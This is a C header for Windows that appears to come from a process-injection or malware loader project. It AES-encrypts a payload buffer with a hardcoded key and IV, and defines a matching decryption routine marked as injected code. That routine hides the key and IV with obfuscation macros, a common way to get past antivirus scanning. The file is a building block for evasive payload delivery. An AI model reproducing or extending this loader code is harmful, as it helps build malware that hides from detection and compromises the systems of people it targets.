#ifndef _ENCRYPT_H_
#define _ENCRYPT_H_

#include <Windows.h>
#include "injected.h"
#include "libaes.h"
#include "libproc.hpp"

EXTERN_C_START

static inline LONG EncryptPayload(IN OUT PBYTE pPayload, IN CONST SIZE_T szPayloadSize) {
    printf("Encrypting %#llx bytes starting at %#p\n", szPayloadSize, pPayload);

    if (szPayloadSize % AES_BLOCKSZ != 0) {
        printf("Payload size must be a multiple of %d\n", AES_BLOCKSZ);
        return ERROR_INCORRECT_SIZE;
    }

    // CONST AES_KEY key = {.b = "sUp3rDuP3rS3cr3T"};
    // CONST AES_IV iv = {.b = "r4Nd0MiVR4nD0mIv"};
    CONST PCAES_KEY pKey = (PCAES_KEY)(PCBYTE)ByteString("sUp3rDuP3rS3cr3T");
    CONST PCAES_IV pIv = (PCAES_IV)(PCBYTE)ByteString("r4Nd0MiVR4nD0mIv");

    AES_SBOX sbox;
    AES_GenerateSbox(&sbox);

    AES_CTX ctx;
    AES_InitCtx(&ctx, pKey, pIv, &sbox, NULL);
    AES_Encrypt(&ctx, pPayload, szPayloadSize);

    return ERROR_SUCCESS;
}

INJECTED_CODE static inline VOID DecryptPayload(IN OUT PBYTE pPayload,
                                                IN CONST SIZE_T szPayloadSize) {
    DECLARE_OBFUSCATED_BYTES(key, "sUp3rDuP3rS3cr3T");
    DECLARE_OBFUSCATED_BYTES(iv, "r4Nd0MiVR4nD0mIv");

    AES_SBOX sbox, sboxInv;
    AES_GenerateSboxAndInv(&sbox, &sboxInv);

    AES_CTX ctx;
    AES_InitCtx(&ctx, (PCAES_KEY)&DEOBF(key).data, (PCAES_IV)&DEOBF(iv).data, &sbox, &sboxInv);
    AES_Decrypt(&ctx, pPayload, szPayloadSize);
}

EXTERN_C_END

#endif  // _ENCRYPT_H_
